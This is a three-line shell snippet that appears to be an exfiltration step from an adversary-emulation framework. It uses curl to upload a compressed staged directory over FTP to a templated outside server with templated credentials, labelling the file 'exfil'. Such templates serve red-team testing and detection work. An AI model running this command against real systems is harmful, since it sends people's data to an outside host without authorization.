LocalFile='#{host.dir.compress}';
RemoteName="$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)";
curl -T #{host.dir.compress} ftp://#{ftp.server.address}/$RemoteName --user #{ftp.user.name}:'#{ftp.user.password}'
